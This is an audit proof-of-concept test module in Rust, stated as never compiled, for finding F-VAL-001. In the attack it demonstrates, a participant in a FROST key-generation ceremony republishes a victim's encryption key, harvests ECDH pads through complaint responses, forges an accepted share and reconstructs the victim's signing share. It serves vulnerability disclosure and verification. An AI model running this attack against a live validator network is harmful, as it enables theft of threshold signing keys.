//! PoC for F-VAL-001 — DKG encryption key `q` has no proof of possession.
//!
//! NEVER COMPILED. Written by QA-VAL against commit `2893917` by reading the
//! source; there is no Rust toolchain on the audit host. See `README.md` in
//! this directory for how to wire it in and what a pass/fail means.
//!
//! This module is meant to be included *inside* the `validator` crate's
//! `crate::frost` module, because the attack needs `frost::marshal` and
//! `frost::participants`, which are private to `crate::frost`, and
//! `KeyShare::as_key_package`, which is `pub(super)` there. Add one line to
//! `crates/validator/src/frost/mod.rs`:
//!
//! ```ignore
//! #[cfg(test)]
//! #[path = "../../../../rust-audit/poc/F-VAL-001/poc.rs"]
//! mod poc_f_val_001;
//! ```
//!
//! The three tests, in increasing strength:
//!
//! * `pad_opens_two_recipients_slots` — the cryptographic core. One ECDH pad
//!   decrypts both the victim's slot and the impostor's slot. ~1 s.
//! * `impostor_share_verifies_and_group_finalizes` — the impostor's
//!   re-encrypted share passes every honest peer's
//!   `verify_encrypted_secret_share`, and the ceremony finalizes with one group
//!   verifying key. This is Critic C-VAL-A's "step 5", the link most likely to
//!   be wrong.
//! * `impostor_recovers_victim_signing_share` — the whole chain: harvest,
//!   Lagrange interpolation, and a byte-for-byte comparison of the recovered
//!   scalar with the victim's real FROST signing share.

use super::{keygen, marshal, participants};
use crate::bindings;
use alloy::primitives::{Address, U256, address};
use frost_secp256k1::Identifier;
// `Field` and `PrimeField` are imported for `Scalar::ZERO`/`ONE`, `invert()` and
// `from_repr()`. k256 0.13 also provides some of these as inherent items, in
// which case the trait imports are redundant — hence the `allow`.
#[allow(unused_imports)]
use k256::elliptic_curve::{Field as _, PrimeField as _};
use k256::Scalar;
use std::collections::BTreeMap;

// ---------------------------------------------------------------------------
// Fixture: the participant set.
//
// Seven Anvil default accounts, matching the addresses the repository's own
// `frost::tests::ceremony` uses. `n = 7` gives `group_threshold(7) = 7/2 + 1 = 4`
// (`crates/validator/src/consensus/group.rs:219-221`), which is the case the
// finding's arithmetic is stated for. VICTIM is the honest participant `A` whose
// signing share leaks; IMPOSTOR is the single malicious registered participant
// `M` (`1 < 7/3`, i.e. inside assumption A2's fault bound).
// ---------------------------------------------------------------------------

const PARTICIPANTS: [Address; 7] = [
    address!("f39Fd6e51aad88F6F4ce6aB8827279cffFb92266"), // anvil #0
    address!("70997970C51812dc3A010C7d01b50e0d17dc79C8"), // anvil #1
    address!("3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"), // anvil #2  <- VICTIM (A)
    address!("90F79bf6EB2c4f870365E785982E1f101E93b906"), // anvil #3
    address!("15d34AAf54267DB7D7c367839AAf71A00a2C6A65"), // anvil #4
    address!("9965507D1a55bcC2695C58ba16FB37d819B0A4dc"), // anvil #5
    address!("976EA74026E726554dB657fA54763abd0C3a0aa9"), // anvil #6  <- IMPOSTOR (M)
];

const VICTIM: Address = PARTICIPANTS[2];
const IMPOSTOR: Address = PARTICIPANTS[6];
const COUNT: u16 = 7;
const THRESHOLD: u16 = 4; // consensus::group::group_threshold(7)

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Byte-wise XOR of two 32-byte onchain scalars. `frost::ecdh::ecdh` XORs the
/// message with the affine x-coordinate of the shared point
/// (`crates/validator/src/frost/ecdh.rs:110-121`), so
/// `plaintext XOR ciphertext == pad`.
fn xor(a: U256, b: U256) -> U256 {
    let (a, b) = (a.to_be_bytes::<32>(), b.to_be_bytes::<32>());
    let mut out = [0u8; 32];
    for i in 0..32 {
        out[i] = a[i] ^ b[i];
    }
    U256::from_be_bytes(out)
}

/// The index of `recipient` in `sender`'s published `f` array.
///
/// `generate_secret_shares` builds `f` by iterating the `BTreeMap<Address, _>`
/// of commitments (ascending address) and filtering out the sender
/// (`crates/validator/src/frost/keygen.rs:196-214`); `verify_encrypted_secret_share`
/// recomputes the same index (`:365-374`).
fn slot(sender: Address, recipient: Address) -> usize {
    let mut sorted = PARTICIPANTS.to_vec();
    sorted.sort();
    sorted
        .iter()
        .filter(|a| **a != sender)
        .position(|a| *a == recipient)
        .expect("recipient is a participant other than the sender")
}

/// The FROST identifier of `address` as a field element.
///
/// NOTE (dependency question, see `poc/UNRESOLVED-DEPENDENCY-QUESTIONS-VAL.md` VAL-Q1):
/// `frost_core::Identifier::serialize` returns `Vec<u8>` in some 3.x releases
/// and the ciphersuite `Serialization` type (`k256::FieldBytes`) in others.
/// Both implement `AsRef<[u8]>`, so this conversion is written to compile
/// against either. If it does not, replace the body with
/// `frost_core::Identifier::to_scalar(&id)` — the validator already enables
/// `frost-core`'s `internals` feature (`crates/validator/Cargo.toml:11`).
fn identifier_scalar(id: &Identifier) -> Scalar {
    let serialized = id.serialize();
    let bytes: &[u8] = serialized.as_ref();
    assert_eq!(bytes.len(), 32, "secp256k1 identifiers serialize to 32 bytes");
    let mut repr = k256::FieldBytes::default();
    repr.copy_from_slice(bytes);
    Scalar::from_repr(repr)
        .into_option()
        .expect("a FROST identifier is a canonical scalar")
}

fn id_scalar(address: Address) -> Scalar {
    identifier_scalar(&participants::identifier(address))
}

fn to_scalar(value: U256) -> Scalar {
    marshal::frost_scalar(&value).expect("canonical scalar")
}

/// Lagrange interpolation of the unique polynomial through `points`, evaluated
/// at `x`. `points` must hold at least `THRESHOLD` distinct evaluations of a
/// degree-`THRESHOLD - 1` polynomial.
fn interpolate_at(points: &[(Scalar, Scalar)], x: Scalar) -> Scalar {
    let mut acc = Scalar::ZERO;
    for (i, (xi, yi)) in points.iter().enumerate() {
        let mut numerator = Scalar::ONE;
        let mut denominator = Scalar::ONE;
        for (j, (xj, _)) in points.iter().enumerate() {
            if i == j {
                continue;
            }
            numerator *= x - *xj;
            denominator *= *xi - *xj;
        }
        acc += *yi * numerator * denominator.invert().unwrap();
    }
    acc
}

fn copy_point(point: &bindings::Point) -> bindings::Point {
    bindings::Point {
        x: point.x,
        y: point.y,
    }
}

// ---------------------------------------------------------------------------
// The ceremony, run to the point where the harvest happens.
// ---------------------------------------------------------------------------

#[allow(dead_code)]
struct Ceremony {
    /// Every participant's published round-1 commitment. Retained so a reader
    /// can inspect the tampered `q` in a debugger. `IMPOSTOR`'s carries
    /// `VICTIM`'s `q`.
    commitments: BTreeMap<Address, bindings::KeyGenCommitment>,
    /// The verified view every node holds after round 1.
    verified: BTreeMap<Address, keygen::VerifiedCommitment>,
    /// Every participant's post-round-2 secret state.
    sharing_states: BTreeMap<Address, keygen::SharingState>,
    /// The `KeyGenSecretShare` each participant published. `IMPOSTOR`'s entry is
    /// the one it produced honestly, whose ciphertexts are *wrong* because its
    /// published `q` is not its own.
    published: BTreeMap<Address, bindings::KeyGenSecretShare>,
}

/// Runs rounds 1 and 2 with `IMPOSTOR` republishing `VICTIM`'s `q`.
///
/// Step 1-3 of the finding's Trigger.
fn run_rounds_1_and_2() -> Ceremony {
    let mut rng = rand::thread_rng();

    // Round 1. Every participant samples its own secrets.
    let mut secrets = BTreeMap::new();
    let mut commitments = BTreeMap::new();
    for participant in PARTICIPANTS {
        let s = keygen::setup(&mut rng, participant, COUNT, THRESHOLD)
            .expect("setup succeeds for a 4-of-7 group");
        commitments.insert(participant, s.commitment());
        secrets.insert(participant, s);
    }

    // *** THE ATTACK, Trigger step 2. ***
    // `IMPOSTOR` publishes its own genuine polynomial commitment `c` and a valid
    // proof of knowledge over it, but replaces `q` with the value it copied
    // verbatim out of `VICTIM`'s already-indexed `KeyGenCommitted` event.
    let stolen_q = copy_point(&commitments[&VICTIM].q);
    commitments
        .get_mut(&IMPOSTOR)
        .expect("impostor is a participant")
        .q = stolen_q;

    // Every node verifies every commitment. The tampered one is accepted:
    // `verify_commitment` checks only the proof of knowledge over `c`
    // (`crates/validator/src/frost/keygen.rs:86-99`).
    let verified = PARTICIPANTS
        .into_iter()
        .map(|participant| {
            let v = keygen::verify_commitment(participant, &commitments[&participant])
                .unwrap_or_else(|e| {
                    panic!("verify_commitment rejected {participant}: {e:?} — if this is the impostor, F-VAL-001 step 2 is REFUTED")
                });
            (participant, v)
        })
        .collect::<BTreeMap<_, _>>();

    assert_eq!(
        commitments[&IMPOSTOR].q, commitments[&VICTIM].q,
        "the impostor's published q is the victim's q"
    );
    assert_ne!(
        commitments[&IMPOSTOR].c, commitments[&VICTIM].c,
        "the impostor's polynomial is its own, so its proof of knowledge is genuine"
    );

    // Round 2. Every participant, honest and malicious, produces its sharing
    // state and its encrypted shares.
    let mut sharing_states = BTreeMap::new();
    let mut published = BTreeMap::new();
    for (participant, s) in secrets {
        let (sharing_state, share) = keygen::generate_secret_shares(s, verified.clone())
            .expect("round 2 succeeds; the impostor's `c` is genuine");
        sharing_states.insert(participant, sharing_state);
        published.insert(participant, share);
    }

    Ceremony {
        commitments,
        verified,
        sharing_states,
        published,
    }
}

/// Trigger steps 4-6: `IMPOSTOR` files one complaint against each of the other
/// six participants *before publishing its own share*, and each honest accused
/// answers with the plaintext `f_X(id_M)`. XOR-ing that against the accused's
/// already-public ciphertext slot for `M` yields `pad(sk_X, q_A)`.
///
/// Returns `pad(sk_X, q_VICTIM)` for every `X != IMPOSTOR`, together with the
/// plaintext complaint responses themselves.
fn harvest_pads(c: &Ceremony) -> (BTreeMap<Address, U256>, BTreeMap<Address, U256>) {
    let mut pads = BTreeMap::new();
    let mut responses = BTreeMap::new();
    for accused in PARTICIPANTS {
        if accused == IMPOSTOR {
            continue;
        }
        // `handle_key_gen_complained` answers unconditionally in
        // `CollectingShares` (`crates/validator/src/state/keygen.rs:734-745`),
        // calling `reveal_secret_share` (`frost/keygen.rs:420-428`).
        let revealed = keygen::reveal_secret_share(&c.sharing_states[&accused], IMPOSTOR)
            .expect("every group member has a peer package");
        let ciphertext = c.published[&accused].f[slot(accused, IMPOSTOR)];
        pads.insert(accused, xor(revealed, ciphertext));
        responses.insert(accused, revealed);
    }
    (pads, responses)
}

/// Trigger step 7: `IMPOSTOR` republishes its `KeyGenSecretShare` with every
/// slot encrypted under the pad it just harvested. `y` is unchanged — it is the
/// publicly recomputable verifying share.
fn forge_impostor_share(
    c: &Ceremony,
    pads: &BTreeMap<Address, U256>,
) -> bindings::KeyGenSecretShare {
    let mut sorted = PARTICIPANTS.to_vec();
    sorted.sort();
    let f = sorted
        .iter()
        .filter(|a| **a != IMPOSTOR)
        .map(|peer| {
            let plaintext = keygen::reveal_secret_share(&c.sharing_states[&IMPOSTOR], *peer)
                .expect("the impostor knows its own polynomial");
            xor(plaintext, pads[peer])
        })
        .collect();
    bindings::KeyGenSecretShare {
        y: copy_point(&c.published[&IMPOSTOR].y),
        f,
    }
}

// ---------------------------------------------------------------------------
// Test 1 — the cryptographic core.
// ---------------------------------------------------------------------------

/// One pad opens two recipients' slots.
///
/// PASS (assertions hold) ⇒ F-VAL-001's load-bearing algebraic fact is real:
/// with `q_M := q_A`, every honest `B`'s ciphertext to `M` and its ciphertext to
/// `A` are masked with the *same* 32-byte pad, so one plaintext reveal opens
/// both. It also shows the pad is symmetric, so `A`'s own ciphertext to `B` is
/// masked with that same pad.
///
/// FAIL (any assertion trips) ⇒ some binding of `q` to its publisher, or some
/// direction/identity tweak in the pad, exists that the audit missed, and
/// F-VAL-001 collapses.
#[test]
fn pad_opens_two_recipients_slots() {
    let c = run_rounds_1_and_2();
    let (pads, responses) = harvest_pads(&c);

    for bystander in PARTICIPANTS {
        if bystander == IMPOSTOR || bystander == VICTIM {
            continue;
        }
        let pad = pads[&bystander];

        // (i) The pad the bystander used for the impostor is the pad it used
        //     for the victim: one complaint response opens the victim's slot.
        let victim_slot = c.published[&bystander].f[slot(bystander, VICTIM)];
        let f_b_at_a = xor(victim_slot, pad);

        // Cross-check against ground truth the attacker does not have.
        let ground_truth = keygen::reveal_secret_share(&c.sharing_states[&bystander], VICTIM)
            .expect("ground truth");
        assert_eq!(
            f_b_at_a, ground_truth,
            "one complaint response against {bystander} exposed f_{{{bystander}}}(id_VICTIM)"
        );

        // (ii) The pad is symmetric, so it also opens the victim's OWN
        //      ciphertext addressed to this bystander.
        let outbound_slot = c.published[&VICTIM].f[slot(VICTIM, bystander)];
        let f_a_at_b = xor(outbound_slot, pad);
        let ground_truth = keygen::reveal_secret_share(&c.sharing_states[&VICTIM], bystander)
            .expect("ground truth");
        assert_eq!(
            f_a_at_b, ground_truth,
            "the same pad exposed f_VICTIM(id_{{{bystander}}})"
        );

        // The complaint response really was the plaintext share, as claimed.
        assert_eq!(
            responses[&bystander],
            keygen::reveal_secret_share(&c.sharing_states[&bystander], IMPOSTOR).unwrap()
        );
    }
}

// ---------------------------------------------------------------------------
// Test 2 — Critic C-VAL-A's step 5: the attacker is NOT excluded.
// ---------------------------------------------------------------------------

/// The impostor's re-encrypted share verifies for every honest peer, and the
/// ceremony finalizes with one group key.
///
/// PASS ⇒ the attack is invisible: no honest participant has grounds to
/// complain about the impostor, and the group `FINALIZED`s with the impostor
/// inside. This refutes the earlier VAL-H1 assumption that the attacker must
/// publish an undecryptable share and be excluded.
///
/// FAIL, specifically at `verify_encrypted_secret_share` for the impostor ⇒
/// step 5 is refuted and the attack is detectable; F-VAL-001's severity drops
/// to at most High (a griefing/abort vector), because the group would be marked
/// `COMPROMISED` before finalizing.
#[test]
fn impostor_share_verifies_and_group_finalizes() {
    let c = run_rounds_1_and_2();
    let (pads, _) = harvest_pads(&c);

    // Control: without the harvest, the impostor's honestly-produced share is
    // undecryptable for its peers, because it encrypted under `sk_M` while they
    // decrypt under the published `q_A`. This is the case the design assumed.
    let naive = &c.published[&IMPOSTOR];
    let mut naive_rejections = 0;
    for peer in PARTICIPANTS {
        if peer == IMPOSTOR {
            continue;
        }
        let (_, encrypted) =
            keygen::verify_secret_share(c.sharing_states[&peer].group_commitments(), IMPOSTOR, naive)
                .expect("`y` is publicly recomputable and correct either way");
        if keygen::verify_encrypted_secret_share(&c.sharing_states[&peer], IMPOSTOR, encrypted)
            .is_err()
        {
            naive_rejections += 1;
        }
    }
    assert_eq!(
        naive_rejections, 6,
        "without harvesting, all six peers reject the impostor's share"
    );

    // The attack: republish with the harvested pads.
    let forged = forge_impostor_share(&c, &pads);
    let Ceremony {
        published,
        verified,
        mut sharing_states,
        ..
    } = c;

    let mut verified_shares: BTreeMap<Address, BTreeMap<Address, keygen::VerifiedShare>> =
        BTreeMap::new();
    for holder in PARTICIPANTS {
        let mut per_holder = BTreeMap::new();
        for peer in PARTICIPANTS {
            let share = if peer == IMPOSTOR {
                &forged
            } else {
                &published[&peer]
            };
            let (_, encrypted) = keygen::verify_secret_share(
                sharing_states[&holder].group_commitments(),
                peer,
                share,
            )
            .expect("public verification passes");
            let ok = keygen::verify_encrypted_secret_share(
                &sharing_states[&holder],
                peer,
                encrypted,
            )
            .unwrap_or_else(|e| {
                panic!(
                    "{holder} rejected {peer}'s share: {e:?} — if peer is the impostor, \
                     F-VAL-001 step 5 is REFUTED"
                )
            });
            per_holder.insert(peer, ok);
        }
        verified_shares.insert(holder, per_holder);
    }

    // Everyone finalizes, including the victim, and they agree on one group key.
    let group_key = keygen::group_commitments(verified)
        .expect("group commitments")
        .group_key();
    for holder in PARTICIPANTS {
        let state = sharing_states.remove(&holder).expect("state");
        let shares = verified_shares.remove(&holder).expect("shares");
        let key_share = keygen::finalize(state, shares)
            .unwrap_or_else(|e| panic!("{holder} failed to finalize: {e:?}"));
        assert_eq!(key_share.group_threshold(), THRESHOLD);
    }
    assert!(!group_key.x.is_zero(), "the group produced a key");
}

// ---------------------------------------------------------------------------
// Test 3 — the whole chain: the impostor reconstructs the victim's key share.
// ---------------------------------------------------------------------------

/// The impostor recovers the victim's complete FROST signing share.
///
/// PASS ⇒ F-VAL-001 is reproduced end to end at `E1` strength: a single
/// registered participant, inside assumption A2's `< n/3` fault bound, holds
/// honest participant `A`'s signing share in a group that finalized normally.
/// Severity Critical is confirmed.
///
/// FAIL at the final `assert_eq!` while tests 1 and 2 pass ⇒ the leak is
/// partial (the attacker holds `s_A` minus some term) and the finding should be
/// restated: still a share-material leak, but the "complete signing share"
/// claim would need correcting.
#[test]
fn impostor_recovers_victim_signing_share() {
    let c = run_rounds_1_and_2();
    let (pads, responses) = harvest_pads(&c);
    let forged = forge_impostor_share(&c, &pads);

    // The impostor's own evaluation at the victim's identifier, taken before the
    // finalize loop consumes the sharing states. This is `f_M(id_A)`, which the
    // impostor knows outright: it is its own polynomial.
    let impostor_at_victim =
        keygen::reveal_secret_share(&c.sharing_states[&IMPOSTOR], VICTIM).expect("own polynomial");

    let Ceremony {
        published,
        mut sharing_states,
        ..
    } = c;

    // Everyone finalizes (Trigger step 8).
    let mut key_shares = BTreeMap::new();
    for holder in PARTICIPANTS {
        let state = sharing_states.remove(&holder).expect("state");
        let shares = PARTICIPANTS
            .into_iter()
            .map(|peer| {
                let share = if peer == IMPOSTOR {
                    &forged
                } else {
                    &published[&peer]
                };
                let (_, encrypted) =
                    keygen::verify_secret_share(state.group_commitments(), peer, share)
                        .expect("public verification passes");
                let verified =
                    keygen::verify_encrypted_secret_share(&state, peer, encrypted).expect("accepted");
                (peer, verified)
            })
            .collect();
        key_shares.insert(holder, keygen::finalize(state, shares).expect("finalize"));
    }

    // ---- Everything below uses ONLY data the impostor has: the public
    // ---- `KeyGenCommitted` / `KeyGenSecretShared` / `KeyGenComplaintResponded`
    // ---- events, and its own secrets. ----

    // (a) `f_A` evaluated at every other participant's identifier.
    //
    //   * at `id_M`: the victim's own complaint response (Trigger step 5).
    //   * at `id_B`: the victim's public ciphertext slot for `B`, unmasked with
    //     `pad(sk_B, q_A)` — available by pad symmetry (Trigger step 9).
    let mut f_victim: Vec<(Scalar, Scalar)> = Vec::new();
    f_victim.push((id_scalar(IMPOSTOR), to_scalar(responses[&VICTIM])));
    for bystander in PARTICIPANTS {
        if bystander == IMPOSTOR || bystander == VICTIM {
            continue;
        }
        let ciphertext = published[&VICTIM].f[slot(VICTIM, bystander)];
        f_victim.push((
            id_scalar(bystander),
            to_scalar(xor(ciphertext, pads[&bystander])),
        ));
    }
    assert_eq!(f_victim.len(), 6, "n - 1 = 6 evaluations of a degree-3 poly");

    // (b) The self-term `f_A(id_A)`, by Lagrange interpolation. Only the first
    //     `THRESHOLD` points are needed; the rest are a consistency check.
    let victim_id = id_scalar(VICTIM);
    let self_term = interpolate_at(&f_victim[..THRESHOLD as usize], victim_id);
    assert_eq!(
        self_term,
        interpolate_at(&f_victim, victim_id),
        "any threshold-sized subset interpolates to the same polynomial"
    );

    // (c) Every other participant's evaluation at the victim's identifier.
    //     For the bystanders this is their public ciphertext slot for the victim
    //     unmasked with the harvested pad; for the impostor it is its own
    //     polynomial.
    let mut sum = self_term;
    for peer in PARTICIPANTS {
        if peer == VICTIM {
            continue;
        }
        let contribution = if peer == IMPOSTOR {
            to_scalar(impostor_at_victim)
        } else {
            to_scalar(xor(published[&peer].f[slot(peer, VICTIM)], pads[&peer]))
        };
        sum += contribution;
    }

    // (d) Compare with ground truth.
    let real = key_shares[&VICTIM]
        .as_key_package()
        .signing_share()
        .to_scalar();
    assert_eq!(
        marshal::solidity_scalar(&sum),
        marshal::solidity_scalar(&real),
        "the impostor reconstructed the victim's complete FROST signing share"
    );
}
